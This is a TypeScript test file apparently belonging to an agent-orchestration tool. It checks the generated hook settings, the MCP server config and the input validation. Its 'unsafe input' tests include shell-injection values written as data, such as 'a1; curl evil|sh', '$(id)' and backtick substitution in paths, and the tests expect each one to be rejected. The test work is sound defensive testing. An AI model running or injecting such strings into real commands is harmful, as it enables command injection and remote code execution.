import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { HOOK_EVENTS, isHookEvent } from '../hooks/hook-events.js';
import { PERMISSION_HOOK_TIMEOUT_S } from '../hooks/permission-relay.js';
import type { AgentFilesInput } from './agent-files.js';
import { buildMcpConfig, buildSettings, quotePath, writeAgentFiles } from './agent-files.js';

const INPUT: AgentFilesInput = {
  nodePath: String.raw`C:\Program Files\nodejs\node.exe`,
  hookScript: String.raw`C:\cache\guildcraft\dist\bin\hook.js`,
  mcpScript: '/cache/guildcraft/dist/bin/mcp.js',
  port: 7777,
  agentId: 'a1',
};

describe('quotePath', () => {
  it('quotes and uses forward slashes', () => {
    expect(quotePath(String.raw`C:\Program Files\node.exe`)).toBe('"C:/Program Files/node.exe"');
  });
});

describe('buildSettings', () => {
  const { hooks } = buildSettings(INPUT);

  it('registers every hook event plus the permission relay', () => {
    expect(Object.keys(hooks)).toEqual([...HOOK_EVENTS, 'PermissionRequest']);
  });

  it('gives the permission relay a long timeout and every tool', () => {
    expect(hooks.PermissionRequest).toEqual([
      {
        matcher: '*',
        hooks: [
          {
            type: 'command',
            command:
              '"C:/Program Files/nodejs/node.exe" "C:/cache/guildcraft/dist/bin/hook.js" 7777 a1 PermissionRequest',
            timeout: PERMISSION_HOOK_TIMEOUT_S,
          },
        ],
      },
    ]);
  });

  it('runs the hook relay with port, agent and event', () => {
    expect(hooks.Stop).toEqual([
      {
        hooks: [
          {
            type: 'command',
            command:
              '"C:/Program Files/nodejs/node.exe" "C:/cache/guildcraft/dist/bin/hook.js" 7777 a1 Stop',
          },
        ],
      },
    ]);
  });

  it('matches every tool on tool events only', () => {
    expect(hooks.PreToolUse[0]?.matcher).toBe('*');
    expect(hooks.PostToolUse[0]?.matcher).toBe('*');
    expect(hooks.SessionStart[0]).not.toHaveProperty('matcher');
  });
});

describe('unsafe input', () => {
  const builders = [buildSettings, buildMcpConfig];

  it.each(['a1; curl evil|sh', 'a b', '$(id)', '', 'x'.repeat(65)])(
    'rejects agent id %j',
    (agentId) => {
      for (const build of builders) {
        expect(() => build({ ...INPUT, agentId })).toThrow('invalid agent id');
      }
    },
  );

  it.each([0, 65536, 80.5, Number.NaN])('rejects port %s', (port) => {
    for (const build of builders) {
      expect(() => build({ ...INPUT, port })).toThrow('invalid port');
    }
  });

  it.each(['/a$HOME/node', '/a`id`/node', '/a"b/node', 'C:\\%PATH%\\node.exe', '/a\nb'])(
    'rejects shell-sensitive path %j',
    (nodePath) => {
      expect(() => buildSettings({ ...INPUT, nodePath })).toThrow('unsafe path');
      expect(() => buildSettings({ ...INPUT, hookScript: nodePath })).toThrow('unsafe path');
    },
  );
});

describe('buildMcpConfig', () => {
  it('starts the stdio server with agent env', () => {
    expect(buildMcpConfig(INPUT)).toEqual({
      mcpServers: {
        guildcraft: {
          type: 'stdio',
          command: INPUT.nodePath,
          args: [INPUT.mcpScript],
          env: { GUILDCRAFT_PORT: '7777', GUILDCRAFT_AGENT_ID: 'a1' },
        },
      },
    });
  });
});

describe('isHookEvent', () => {
  it.each(HOOK_EVENTS)('accepts %s', (event) => {
    expect(isHookEvent(event)).toBe(true);
  });

  it.each(['SubagentStop', '', 1])('rejects %j', (value) => {
    expect(isHookEvent(value)).toBe(false);
  });
});

describe('writeAgentFiles', () => {
  let root: string;

  beforeEach(async () => {
    root = await mkdtemp(join(tmpdir(), 'guildcraft-files-'));
  });

  afterEach(async () => {
    await rm(root, { recursive: true, force: true });
  });

  it('writes both files into a new agent dir', async () => {
    const dir = join(root, 'agents', 'a1');
    const paths = await writeAgentFiles(dir, INPUT);
    expect(paths).toEqual({ settings: join(dir, 'settings.json'), mcp: join(dir, 'mcp.json') });
    expect(JSON.parse(await readFile(paths.settings, 'utf8'))).toEqual(buildSettings(INPUT));
    expect(JSON.parse(await readFile(paths.mcp, 'utf8'))).toEqual(buildMcpConfig(INPUT));
  });
});
